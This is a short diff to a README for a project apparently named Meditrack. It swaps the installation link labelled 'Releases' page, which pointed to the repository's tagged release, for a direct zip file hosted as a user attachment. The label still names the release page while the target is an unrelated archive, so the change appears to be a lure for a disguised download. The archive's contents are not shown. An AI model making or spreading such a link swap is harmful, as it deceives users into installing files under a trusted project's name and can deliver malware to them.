@@ -10,7 +10,7 @@
 
 ## Installation
 
-1. Download the binary for your platform from the [Releases](https://github.com/alanirawad-sketch/Meditrack/releases/tag/v1.0) page.
+1. Download the binary for your platform from the [Releases](https://github.com/user-attachments/files/24574296/meditrack-aarch64.zip) page.
 2. Place it in a directory included in your PATH.
 
 ## Usage
